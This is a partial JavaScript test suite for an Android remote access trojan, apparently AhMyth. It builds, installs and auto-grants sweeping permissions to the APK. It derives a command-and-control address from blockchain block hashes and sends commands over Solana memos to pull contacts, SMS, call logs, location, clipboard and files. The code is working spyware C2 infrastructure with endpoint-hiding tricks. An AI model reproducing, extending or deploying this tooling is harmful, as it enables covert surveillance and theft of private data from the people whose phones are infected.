    } catch (err) {
        throw new Error(`APK signing failed: ${err.message || err}`);
    }
    
    if (!fs.existsSync(signedApk)) {
        // Try alternative signed name
        if (fs.existsSync(altSigned)) {
            return altSigned;
        }
        throw new Error('APK signing failed - signed file not found');
    }
    
    log('APK signed successfully', 'success');
    return signedApk;
}

// Utility: Install APK
async function installApk(apkPath, deviceId) {
    log(`Installing APK on device ${deviceId}...`, 'info');
    const adbOpts = { timeout: 120000, maxBuffer: 1024 * 1024 * 4 };
    await ensureAdbPort();
    await restartAdbServer();
    
    try {
        await execAsync(adbCmd('start-server'), adbOpts);
    } catch (e) {}
    try {
        await execAsync(adbCmd(`-s ${deviceId} wait-for-device`), { timeout: 30000 });
    } catch (e) {
        log(`wait-for-device: ${e.message}`, 'warn');
    }
    
    // Uninstall old version
    try {
        await execAsync(adbCmd(`-s ${deviceId} uninstall ${PACKAGE_NAME}`), adbOpts);
        log('Old version uninstalled', 'info');
    } catch (e) {
        // Ignore if not installed
    }
    
    // Install new APK
    // Allow downgrade (-d) in case emulator has a newer dev build installed
    const installCmd = adbCmd(`-s ${deviceId} install --no-incremental -r -d "${apkPath}"`);
    try {
        const { stdout, stderr } = await execAsync(installCmd, adbOpts);
        
        if (stdout.includes('Success') || stdout.includes('success')) {
            log('APK installed successfully', 'success');
            return true;
        } else {
            throw new Error(`Installation failed: ${stdout} ${stderr}`);
        }
    } catch (err) {
        if ((err.message && err.message.includes('authorizing')) || (err.stdout && err.stdout.includes('authorizing'))) {
            log('Device authorizing, retrying install after short wait...', 'warn');
            await new Promise(r => setTimeout(r, 5000));
            const { stdout, stderr } = await execAsync(installCmd, adbOpts);
            if (stdout.includes('Success') || stdout.includes('success')) {
                log('APK installed successfully', 'success');
                return true;
            }
            throw new Error(`Installation failed after retry: ${stdout} ${stderr}`);
        }
        throw err;
    }
    
    return true;
}

// Utility: Start app
async function startApp(deviceId) {
    log('Starting app...', 'info');
    const adbOpts = { timeout: 20000 };
    
    // Start MainService first (skip in emulator mode to avoid permission errors)
    if (!EMULATOR_ONLY) {
        try {
            await execAsync(adbCmd(`-s ${deviceId} shell am startservice ${PACKAGE_NAME}/${PACKAGE_NAME}.MainService`), adbOpts);
            log('MainService started', 'info');
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (e) {
            log(`Service start: ${e.message}`, 'info');
        }
    } else {
        log('Skipping explicit service start in emulator mode', 'info');
    }
    
    // Start MainActivity
    try {
        await execAsync(adbCmd(`-s ${deviceId} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`), adbOpts);
        log('MainActivity started', 'info');
        await new Promise(resolve => setTimeout(resolve, 2000));
    } catch (e) {
        log(`Activity start: ${e.message}`, 'info');
    }
    
    // Bring to foreground
    try {
        await execAsync(adbCmd(`-s ${deviceId} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`), adbOpts);
        await new Promise(resolve => setTimeout(resolve, 1000));
    } catch (e) {}
    
    // Verify app is running
    try {
        const { stdout } = await execAsync(adbCmd(`-s ${deviceId} shell pidof ${PACKAGE_NAME}`));
        if (stdout.trim()) {
            log(`App is running (PID: ${stdout.trim()})`, 'success');
        } else {
            log('App PID not found, but may still be starting...', 'warn');
        }
    } catch (e) {
        log('Could not verify app PID', 'warn');
    }
    
    return true;
}

// Utility: Grant permissions
async function grantPermissions(deviceId) {
    log('Granting permissions...', 'info');
    const permissions = [
        'android.permission.CAMERA',
        'android.permission.RECORD_AUDIO',
        'android.permission.READ_CONTACTS',
        'android.permission.READ_SMS',
        'android.permission.SEND_SMS',
        'android.permission.RECEIVE_SMS',
        'android.permission.READ_CALL_LOG',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.ACCESS_COARSE_LOCATION',
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.READ_PHONE_STATE',
        'android.permission.CALL_PHONE',
        'android.permission.GET_ACCOUNTS',
        'android.permission.ACCESS_WIFI_STATE',
        'android.permission.CHANGE_WIFI_STATE',
        'android.permission.ACCESS_BACKGROUND_LOCATION',
        'android.permission.POST_NOTIFICATIONS',
        'android.permission.SYSTEM_ALERT_WINDOW'
    ];
    
    let granted = 0;
    for (const perm of permissions) {
        try {
            await execAsync(adbCmd(`-s ${deviceId} shell pm grant ${PACKAGE_NAME} ${perm}`));
            granted++;
        } catch (e) {
            // Some permissions may fail, that's okay
        }
    }
    
    // Special permissions via appops
    try {
        await execAsync(adbCmd(`-s ${deviceId} shell appops set ${PACKAGE_NAME} REQUEST_IGNORE_BATTERY_OPTIMIZATIONS allow`));
    } catch (e) {}
    
    try {
        await execAsync(adbCmd(`-s ${deviceId} shell appops set ${PACKAGE_NAME} RUN_IN_BACKGROUND allow`));
    } catch (e) {}
    
    try {
        await execAsync(adbCmd(`-s ${deviceId} shell appops set ${PACKAGE_NAME} RUN_ANY_IN_BACKGROUND allow`));
    } catch (e) {}
    
    try {
        await execAsync(adbCmd(`-s ${deviceId} shell appops set ${PACKAGE_NAME} SYSTEM_ALERT_WINDOW allow`));
    } catch (e) {}
    
    try {
        await execAsync(adbCmd(`-s ${deviceId} shell dumpsys deviceidle whitelist +${PACKAGE_NAME}`));
    } catch (e) {}
    
    log(`Permissions granted: ${granted} runtime permissions + special permissions`, 'success');
}

// Get blockchain-derived port and endpoint info
async function getBlockchainPort() {
    try {
        const https = require('https');
        const rpcUrl = BLOCKCHAIN_RPC_URL;
        const url = new URL(rpcUrl);
        const isHttps = url.protocol === 'https:';
        const client = isHttps ? https : http;
        
        log('Querying blockchain RPC for block number...', 'info');
        // Get current block number
        const blockNumberReq = JSON.stringify({
            jsonrpc: "2.0",
            method: "eth_blockNumber",
            params: [],
            id: 1
        });
        
        const blockResponse = await new Promise((resolve, reject) => {
            const req = client.request({
                hostname: url.hostname,
                port: url.port || (isHttps ? 443 : 80),
                path: url.pathname + url.search,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                timeout: 10000
            }, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        resolve(JSON.parse(data));
                    } catch (e) {
                        reject(e);
                    }
                });
            });
            req.on('error', reject);
            req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
            req.write(blockNumberReq);
            req.end();
        });
        
        if (!blockResponse.result) {
            throw new Error('No block number in response');
        }
        
        const blockNumber = parseInt(blockResponse.result, 16);
        const refBlock = blockNumber - (blockNumber % BLOCKCHAIN_BLOCK_STEP);
        log(`Current block: ${blockNumber}, Reference block: ${refBlock} (step: ${BLOCKCHAIN_BLOCK_STEP})`, 'info');
        
        // Get block hash
        log('Querying blockchain RPC for block hash...', 'info');
        const blockHashReq = JSON.stringify({
            jsonrpc: "2.0",
            method: "eth_getBlockByNumber",
            params: ["0x" + refBlock.toString(16), false],
            id: 1
        });
        
        const hashResponse = await new Promise((resolve, reject) => {
            const req = client.request({
                hostname: url.hostname,
                port: url.port || (isHttps ? 443 : 80),
                path: url.pathname + url.search,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                timeout: 10000
            }, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        resolve(JSON.parse(data));
                    } catch (e) {
                        reject(e);
                    }
                });
            });
            req.on('error', reject);
            req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
            req.write(blockHashReq);
            req.end();
        });
        
        if (!hashResponse.result || !hashResponse.result.hash) {
            throw new Error('No block hash in response');
        }
        
        const blockHash = hashResponse.result.hash;
        const hash = blockHash.startsWith('0x') ? blockHash.substring(2) : blockHash;
        const hashBytes = Buffer.from(hash, 'hex');
        
        // Generate IP from blockchain hash: 10.X.Y.Z format (per specification)
        // IP format: 10.{hash[0]}.{hash[1]}.{hash[2] || 1}
        const ip1 = hashBytes[0] & 0xFF;
        const ip2 = hashBytes[1] & 0xFF;
        let ip3 = hashBytes[2] & 0xFF;
        if (ip3 === 0) ip3 = 1; // Ensure non-zero
        const derivedIp = `10.${ip1}.${ip2}.${ip3}`;
        
        // Generate port: 1024 + (hash % 60000) - same logic as Android client
        const portBase = 1024;
        const portRange = 60000;
        const port = portBase + (((hashBytes[3] & 0xFF) << 8 | (hashBytes[4] & 0xFF)) % portRange);
        
        // Generate endpoint (IP and port both from blockchain)
        const endpoint = `http://${derivedIp}:${port}`;
        
        log('\n' + '='.repeat(60), 'header');
        log('BLOCKCHAIN C2 ENDPOINT GENERATED', 'header');
        log('='.repeat(60), 'header');
        log(`Block Number: ${blockNumber}`, 'info');
        log(`Reference Block: ${refBlock}`, 'info');
        log(`Block Hash: ${blockHash}`, 'info');
        log(`Hash Bytes [0:2]: 0x${hashBytes[0].toString(16).padStart(2, '0')}${hashBytes[1].toString(16).padStart(2, '0')}${hashBytes[2].toString(16).padStart(2, '0')}`, 'info');
        log(`Hash Bytes [3:5]: 0x${hashBytes[3].toString(16).padStart(2, '0')}${hashBytes[4].toString(16).padStart(2, '0')}`, 'info');
        log(`Derived IP: ${derivedIp}`, 'success');
        log(`Derived Port: ${port}`, 'success');
        log(`Real Server IP: ${SERVER_IP} (HIDDEN - not used)`, 'info');
        log(`BLOCKCHAIN ENDPOINT: ${endpoint}`, 'success');
        log('='.repeat(60), 'header');
        log('', 'info');
        
        return { ip: derivedIp, port: port };
    } catch (e) {
        log(`Failed to get blockchain port: ${e.message}`, 'error');
        log(`Using default port ${PORT}`, 'warn');
        return PORT;
    }
}

// Start Socket.IO server
async function startServer(serverPort = PORT) {
    return new Promise((resolve, reject) => {
        const httpServer = http.createServer();
        server = httpServer;
        
        io = new Server(httpServer, {
            cors: {
                origin: "*",
                methods: ["GET", "POST"]
            },
            pingInterval: 25000,
            pingTimeout: 20000,
            connectTimeout: 45000,
            allowEIO3: true
        });
        
        httpServer.listen(serverPort, '0.0.0.0', () => {
            log(`Server started on port ${serverPort}`, 'success');
            resolve();
        });
        
        io.on('connection', (socket) => {
            log('Client connected', 'success');
            clientSocket = socket;
            
            const query = socket.handshake.query;
            deviceInfo = {
                id: query.id,
                model: query.model,
                manufacturer: query.manf,
                release: query.release,
                sdk: query.sdk
            };
            
            log(`Device: ${deviceInfo.model} (${deviceInfo.manufacturer})`, 'info');
            log(`Android: ${deviceInfo.release} (SDK ${deviceInfo.sdk})`, 'info');
            
            socket.on('disconnect', () => {
                log('Client disconnected', 'warn');
                clientSocket = null;
            });
        });
    });
}

// Test: Verify connection
async function testConnection() {
    if (IS_SOLANA) {
        return { success: true, message: 'Blockchain memo mode - socket connection skipped' };
    }
    return new Promise((resolve, reject) => {
        if (!clientSocket) {
            reject(new Error('No client connected'));
            return;
        }
        
        const timeout = setTimeout(() => {
            reject(new Error('Connection test timeout'));
        }, TEST_TIMEOUT);
        
        log('Testing connection...', 'info');
        
        // Just verify socket is connected
        if (clientSocket.connected) {
            clearTimeout(timeout);
            resolve({ success: true, message: 'Client connected successfully' });
        } else {
            clearTimeout(timeout);
            reject(new Error('Client socket not connected'));
        }
    });
}

// Test: Verify blockchain C2 endpoint generation
async function testBlockchainC2Endpoint() {
    if (IS_SOLANA) {
        return { success: true, message: 'Blockchain memo mode - endpoint test skipped' };
    }
    return new Promise((resolve, reject) => {
        if (!clientSocket) {
            reject(new Error('No client connected'));
            return;
        }
        
        const timeout = setTimeout(() => {
            reject(new Error('Blockchain C2 test timeout'));
        }, TEST_TIMEOUT);
        
        log('Testing blockchain C2 endpoint generation...', 'info');
        
        // Check logs for blockchain C2 messages
        setTimeout(async () => {
            try {
                const deviceId = await checkAdbDevice();
                const { stdout } = await execAsync(adbCmd(`-s ${deviceId} logcat -d`), { maxBuffer: 1024 * 1024 * 5 });
                
                const lines = stdout.split('\n');
                const relevant = lines.filter(l => /blockchain|iosocket/i.test(l)).slice(-20);
                const hasMatch = relevant.length > 0;
                
                if (hasMatch) {
                    clearTimeout(timeout);
                    resolve({ success: true, message: 'Blockchain C2 endpoint generation detected in logs' });
                } else {
                    clearTimeout(timeout);
                    resolve({ success: true, message: 'Connection established (blockchain C2 may be working)' });
                }
            } catch (e) {
                clearTimeout(timeout);
                resolve({ success: true, message: 'Connection test completed' });
            }
        }, 5000);
    });
}

// Test: Verify Solana C2 Commands
async function testSolanaCommands() {
    if (!IS_SOLANA) {
        return { success: true, message: "Not in Solana mode - skipping Solana C2 command tests" };
    }
    
    log('Testing Solana C2 Commands (Send & Output)...', 'header');
    if (MEMO_ONLY) {
        log('Memo-only mode enabled: skipping ADB log fallback; waiting only for on-chain responses', 'info');
    }

    const defaultRespTimeout = MEMO_ONLY ? 90000 : 35000;
    const RESPONSE_TIMEOUT = parseInt(CLI.values['response-timeout'] || process.env.SOLANA_RESPONSE_TIMEOUT, 10) || defaultRespTimeout;
    
    const COMMANDS_TO_TEST = [
        { cmd: 'x0000si', data: {}, name: 'System Info' },
        { cmd: 'x0000bt', data: {}, name: 'Battery Info' },
        { cmd: 'x0000di', data: {}, name: 'Device Info' },
        { cmd: 'x0000wf', data: {}, name: 'WiFi Info' },
        { cmd: 'x0000cl', data: {}, name: 'Call Logs' },
        { cmd: 'x0000cn', data: {}, name: 'Contacts' },
        { cmd: 'x0000lm', data: {}, name: 'Location' },
        { cmd: 'x0000ca', data: { req: -1 }, name: 'Camera List' },
        { cmd: 'x0000fm', data: { path: '/' }, name: 'File Manager (Root)' },
        { cmd: 'x0000cb', data: { req: 0 }, name: 'Clipboard (Read)' },
        { cmd: 'x0000ns', data: {}, name: 'Network Stats' },
        { cmd: 'x0000pr', data: {}, name: 'Running Processes' },
        { cmd: 'x0000sm', data: { req: 0 }, name: 'SMS List' },
        { cmd: 'x0000us', data: {}, name: 'Usage Stats' }
    ];
    const maxCommands = parseInt(CLI.values['max-commands'] || CLI.values['maxCommands'] || process.env.SOLANA_MAX_COMMANDS || '6', 10);
    const commandsToRun = (CLI.flags.has('full-suite') || CLI.values['full-suite'] === '1' || process.env.SOLANA_FULL_SUITE === '1')
        ? COMMANDS_TO_TEST
        : COMMANDS_TO_TEST.slice(0, Math.min(maxCommands, COMMANDS_TO_TEST.length));
    if (commandsToRun.length < COMMANDS_TO_TEST.length) {
        log(`Running Solana quick set: ${commandsToRun.length}/${COMMANDS_TO_TEST.length} commands (set SOLANA_FULL_SUITE=1 to run all)`, 'info');
    }

    const deviceId = await ensureEmulatorRunning();
    if (!deviceId) throw new Error('No device connected for Solana tests');
    
    // Clear logs first
    await execAsync(adbCmd(`-s ${deviceId} logcat -c`)).catch(() => {});

    const { connection, rpc } = await createSolanaConnection();
    const channelPubkey = new PublicKey(BLOCKCHAIN_CONTRACT);
    const seenSignatures = await snapshotExistingSignatures(connection, channelPubkey);

    const clientAddress = derivePublicKeyFromPrivate(CLIENT_PRIVATE_KEY) || env.BLOCKCHAIN_CLIENT_ADDRESS || env.SOLANA_CLIENT_ADDRESS;
    if (clientAddress) {
        log(`Client wallet: ${clientAddress}`, 'info');
    }
    log(`Channel address: ${BLOCKCHAIN_CONTRACT}`, 'info');
    log(`RPC: ${rpc}`, 'info');

    // Reload operator to ensure it picks up env values
    delete require.cache[require.resolve('./AhMyth-Server/app/blockchain-operator')];
    const { sendCommand } = require('./AhMyth-Server/app/blockchain-operator');

    let passed = 0;
    let failed = 0;
    const failures = [];
    
    for (const test of commandsToRun) {
        log(`\nTesting command: ${test.name} (${test.cmd})...`, 'info');
        // Keep log buffer per-command small so detection does not miss earlier lines
        await execAsync(adbCmd(`-s ${deviceId} logcat -c`)).catch(() => {});
        
        let txInfo = null;
        try {
            txInfo = await sendCommand(test.cmd, test.data || {});
            if (txInfo) {
                log(`Sent ${test.cmd} via blockchain`, 'info');
                log(`  tx: ${txInfo.txSig}`, 'info');
                log(`  rpc: ${txInfo.rpc}`, 'info');
            }
            let memoErr = null;

            const memoPromise = pollForResponseMemo(connection, channelPubkey, seenSignatures, test.cmd, RESPONSE_TIMEOUT)
                .then(res => ({ source: 'memo', res }))
                .catch(err => {
                    memoErr = err;
                    return { source: 'memo', res: null, error: err };
                });
            const logPromise = MEMO_ONLY ? null : waitForResponseLog(deviceId, test.cmd, RESPONSE_TIMEOUT)
                .then(res => ({ source: 'log', res }));

            // Wait for memo first; only use logs as fallback if enabled
            let memoResult = null;
            try {
                memoResult = await memoPromise;
            } catch (e) {
                memoErr = e;
            }
            let logResult = null;
            if ((!memoResult || !memoResult.res || memoResult.res.event !== test.cmd) && !MEMO_ONLY) {
                try {
                    logResult = await logPromise;
                } catch (e) {
                    // ignore log errors
                }
            }

            // Prefer blockchain memo with data
            if (memoResult && memoResult.res && memoResult.res.event === test.cmd) {
                const preview = memoResult.res.data ? JSON.stringify(memoResult.res.data).substring(0, 300) : '';
                log(`OK Blockchain response for ${test.cmd} ${preview ? `(data: ${preview}${preview.length === 300 ? '...' : ''})` : ''}`, 'success');
                log(`Memo response: ${JSON.stringify(memoResult.res).substring(0, 500)}`, 'debug');
                passed++;
                continue;
            }

            // Accept logs as fallback if memo polling fails (ADB available during test)
            if (!MEMO_ONLY && logResult && logResult.res && logResult.res.found) {
                const extra = logResult.res.preview ? ` (log preview: ${logResult.res.preview})` : '';
                const memoNote = memoErr ? `; memo fetch failed: ${memoErr.message}` : '';
                log(`OK Response detected via logs for ${test.cmd}${extra}${memoNote}`, 'success');
                if (logResult.res.lines && logResult.res.lines.length) {
                    logResult.res.lines.forEach(l => log(`  log: ${l.trim()}`, 'debug'));
                }
                passed++;
            } else {
                failed++;
                const reason = memoErr ? memoErr.message : 'No blockchain response or log';
                failures.push(`${test.cmd}: ${reason}`);
                log(`FAIL No response for ${test.cmd}: ${reason}`, 'error');
            }
            
        } catch (e) {
            failed++;
            failures.push(`${test.cmd}: ${e.message}`);
            log(`FAIL No response for ${test.cmd}: ${e.message}`, 'error');
        }
    }
    
    if (failed > 0) {
        throw new Error(`${failed}/${commandsToRun.length} Solana command tests failed: ${failures.join('; ')}`);
    }
    
    return { success: true, message: `All ${passed} Solana command tests passed via blockchain memos` };
}
// Run test
async function runTest(name, testFn) {
    log(`\n${'='.repeat(60)}`, 'header');
    log(`Test: ${name}`, 'header');
    log('='.repeat(60), 'header');
    
    const startTime = Date.now();
    let result = { name, success: false, error: null, duration: 0 };
    
    try {
        const testResult = await Promise.race([
            testFn(),
            new Promise((_, reject) => 
                setTimeout(() => reject(new Error('Test timeout')), TEST_TIMEOUT)
            )
        ]);
        
        result.success = true;
        result.message = testResult.message || 'Test passed';
        result.duration = Date.now() - startTime;
        
        log(`OK ${name}: ${result.message} (${result.duration}ms)`, 'success');
    } catch (error) {
        result.success = false;
        result.error = error.message;
        result.duration = Date.now() - startTime;
        
        log(`FAIL ${name}: ${result.error} (${result.duration}ms)`, 'error');
    }
    
    testResults.push(result);
    return result;
}

// Main test suite
async function runTestSuite() {
    log('\n' + '='.repeat(60), 'header');
    log('Blockchain C2 Test Suite', 'header');
    log('='.repeat(60), 'header');
    log(`RPC URL: ${BLOCKCHAIN_RPC_URL}`, 'info');
    log(`Mode: ${IS_SOLANA ? 'Solana memo' : 'EVM events'}`, 'info');
    log(`Server IP: ${SERVER_IP}`, 'info');
    log(`Server Port: ${PORT}`, 'info');
    log('='.repeat(60) + '\n', 'header');
    
    let deviceId = null;
    let apkPath = null;
    
    try {
        // Step 1: Check ADB device
        deviceId = await ensureEmulatorRunning();
        if (!deviceId) {
            throw new Error('No ADB device available');
        }
        
        // Step 2: Build APK
        apkPath = await buildBlockchainC2Apk();
        
        // Step 3: Install APK
        await installApk(apkPath, deviceId);
        
        // Step 4: Grant permissions
        await grantPermissions(deviceId);
        
        // Step 5: Get blockchain-derived IP/port (EVM) or skip server for Solana memo
        let blockchainPort = PORT;
        let blockchainIp = SERVER_IP;
        if (!IS_SOLANA) {
            const blockchainEndpoint = await getBlockchainPort();
            blockchainPort = blockchainEndpoint.port;
            blockchainIp = blockchainEndpoint.ip;
            await startServer(blockchainPort);
            
            log('Testing server connectivity...', 'info');
            log(`Server listening on 0.0.0.0:${blockchainPort} (accepts connections on any IP)`, 'info');
            log(`Client will connect to ${blockchainIp}:${blockchainPort} (blockchain-derived)`, 'info');
            try {
                    const { stdout, stderr } = await execAsync(`curl.exe -s -o nul -w "%{http_code}" --connect-timeout 5 "http://${SERVER_IP}:${blockchainPort}/socket.io/?EIO=4&transport=polling"`, { timeout: 6000 });
                if (stdout && (stdout.includes('200') || stdout.includes('400') || stdout.includes('0'))) {
                    log('Server is accessible', 'success');
                } else {
                    log('Server connectivity test inconclusive, but continuing...', 'warn');
                }
            } catch (e) {
                log('Server connectivity test failed (this is OK if server just started): ' + e.message, 'warn');
            }
        } else {
            log('Solana memo mode: skipping Socket.IO server setup', 'info');
        }
        
        // Step 6: Start app
        await startApp(deviceId);
        
        // Check logs for errors (Windows-compatible, non-blocking)
        log('Checking logs for errors...', 'info');
        try {
            // Use PowerShell to filter logs (Windows-compatible) with limit to avoid hanging
            const logCmd = adbCmd(`-s ${deviceId} logcat -d -t 100`);
            const { stdout } = await runCommand(logCmd);
            if (stdout) {
                const lines = stdout.split('\n')
                    .filter(l => {
                        const lower = l.toLowerCase();
                        // Filter out system noise
                        if (lower.includes('thermal_src') || 
                            lower.includes('wifistai') ||
                            lower.includes('windowmanagershell') ||
                            lower.includes('activitytaskmanager') ||
                            lower.includes('libc') ||
                            lower.includes('milletpolicy') ||
                            lower.includes('processmanager') ||
                            lower.includes('mvfstcallbacks')) {
                            return false;
                        }
                        // Only show relevant app logs
                        return lower.includes('ahmyth') || 
                               lower.includes('blockchain') || 
                               lower.includes('iosocket') || 
                               lower.includes('connectionmanager') ||
                               lower.includes('mainservice') ||
                               (lower.includes('error') && lower.includes('ahmyth')) ||
                               (lower.includes('exception') && lower.includes('ahmyth'));
                    })
                    .slice(-30);
                if (lines.length > 0) {
                    log('Recent relevant logs:', 'debug');
                    lines.slice(-15).forEach(line => {
                        if (line.toLowerCase().includes('error') || line.toLowerCase().includes('exception')) {
                            log(`  ${line}`, 'error');
                        } else {
                            log(`  ${line}`, 'debug');
                        }
                    });
                }
            }
        } catch (e) {
            log(`Could not check logs: ${e.message}`, 'warn');
        }
        
        // Wait for connection (longer timeout for blockchain C2)
        if (!IS_SOLANA) {
            log('Waiting for client connection (up to 60 seconds)...', 'info');
            let connected = false;
            for (let i = 0; i < 60; i++) {
                if (clientSocket) {
                    connected = true;
                    log(`Client connected after ${i} seconds`, 'success');
                    break;
                }
                if (i % 10 === 0 && i > 0) {
                    log(`Still waiting... (${i}/60 seconds)`, 'info');
                    try {
                        await execAsync(adbCmd(`-s ${deviceId} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`));
                    } catch (e) {}
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            if (!connected) {
                log('Connection failed. Checking detailed logs...', 'warn');
                try {
                    const { stdout: allLogs } = await execAsync(adbCmd(`-s ${deviceId} logcat -d -t 200`), { maxBuffer: 1024 * 1024 * 2 });
                    if (allLogs) {
                        const logLines = allLogs.split('\n');
                        const iosocketLogs = logLines
                            .filter(l => {
                                const lower = l.toLowerCase();
                                if (lower.includes('thermal_src') || lower.includes('wifistai') || 
                                    lower.includes('windowmanagershell') || lower.includes('libc')) {
                                    return false;
                                }
                                return lower.includes('iosocket') || 
                                       lower.includes('blockchainc2') ||
                                       lower.includes('blockchain c2');
                            })
                            .slice(-30);
                        if (iosocketLogs.length > 0) {
                            log('IOSocket/BlockchainC2 logs:', 'error');
                            iosocketLogs.forEach(line => {
                                if (line.toLowerCase().includes('error') || line.toLowerCase().includes('exception') || line.toLowerCase().includes('failed')) {
                                    log(`  [ERROR] ${line}`, 'error');
                                } else {
                                    log(`  ${line}`, 'debug');
                                }
                            });
                        }
                        const connectionLogs = logLines
                            .filter(l => {
                                const lower = l.toLowerCase();
                                if (lower.includes('thermal_src') || lower.includes('wifistai') || 
                                    lower.includes('mvfstcallbacks') || lower.includes('libc')) {
                                    return false;
                                }
                                return (lower.includes('connection') || 
                                       lower.includes('connect') || 
                                       lower.includes('socket') || 
                                       lower.includes('network')) &&
                                      (lower.includes('ahmyth') || 
                                       (lower.includes('error') && lower.includes('ahmyth')) || 
                                       (lower.includes('exception') && lower.includes('ahmyth')) || 
                                       (lower.includes('failed') && lower.includes('ahmyth')));
                            })
                            .slice(-20);
                        if (connectionLogs.length > 0) {
                            log('Connection-related errors:', 'error');
                            connectionLogs.forEach(line => {
                                log(`  ${line}`, 'error');
                            });
                        }
                        const serviceLogs = logLines
                            .filter(l => l.toLowerCase().includes('mainservice') || 
                                        (l.toLowerCase().includes('ahmyth') && l.toLowerCase().includes('service')))
                            .slice(-20);
                        if (serviceLogs.length > 0) {
                            log('MainService logs:', 'debug');
                            serviceLogs.forEach(line => {
                                log(`  ${line}`, 'debug');
                            });
                        }
                        const recentErrors = logLines
                            .filter(l => {
                                const lower = l.toLowerCase();
                                if (lower.includes('thermal_src') || lower.includes('wifistai') || 
                                    lower.includes('mvfstcallbacks') || lower.includes('libc') ||
                                    lower.includes('processmanager') || lower.includes('milletpolicy')) {
                                    return false;
                                }
                                return (lower.includes('error') || 
                                       lower.includes('exception') ||
                                       lower.includes('fatal')) &&
                                      (lower.includes('ahmyth') || 
                                       lower.includes('blockchain') || 
                                       lower.includes('iosocket') ||
                                       lower.includes('connectionmanager') ||
                                       lower.includes('mainservice'));
                            })
                            .slice(-10);
                        if (recentErrors.length > 0) {
                            log('Recent errors:', 'error');
                            recentErrors.forEach(line => {
                                log(`  ${line}`, 'error');
                            });
                        }
                    }
                } catch (e) {
                    log(`Error checking logs: ${e.message}`, 'warn');
                }
                throw new Error('Client did not connect within 60 seconds. Check logs above for errors.');
            }
        } else {
            log('Solana memo mode: skipping Socket.IO wait; app should poll memos instead.', 'info');
        }
        
        // Step 7: Run tests
        await runTest('Connection Test', testConnection);
        await runTest('Blockchain C2 Endpoint Generation', testBlockchainC2Endpoint);
        await runTest('Solana C2 Command Output Test', testSolanaCommands);
        
        // Summary
        log('\n' + '='.repeat(60), 'header');
        log('Test Summary', 'header');
        log('='.repeat(60), 'header');
        
        const passed = testResults.filter(r => r.success).length;
        const failed = testResults.filter(r => !r.success).length;
        
        testResults.forEach(result => {
            const status = result.success ? 'OK' : 'FAIL';
            const color = result.success ? 'success' : 'error';
            log(`${status} ${result.name} (${result.duration}ms)`, color);
            if (result.error) {
                log(`  Error: ${result.error}`, 'error');
            }
        });
        
        log('='.repeat(60), 'header');
        log(`Total: ${testResults.length} | Passed: ${passed} | Failed: ${failed}`, 
            failed > 0 ? 'error' : 'success');
        log('='.repeat(60) + '\n', 'header');
        
        if (failed > 0) {
            process.exit(1);
        }
        
    } catch (error) {
        log(`Fatal error: ${error.message}`, 'error');
        process.exit(1);
    } finally {
        if (server) {
            server.close();
        }
    }
}

// Run if called directly
if (require.main === module) {
    runTestSuite()
        .then(() => process.exit(0))
        .catch(error => {
            log(`Fatal error: ${error.message}`, 'error');
            process.exit(1);
        });
}

module.exports = { runTestSuite };
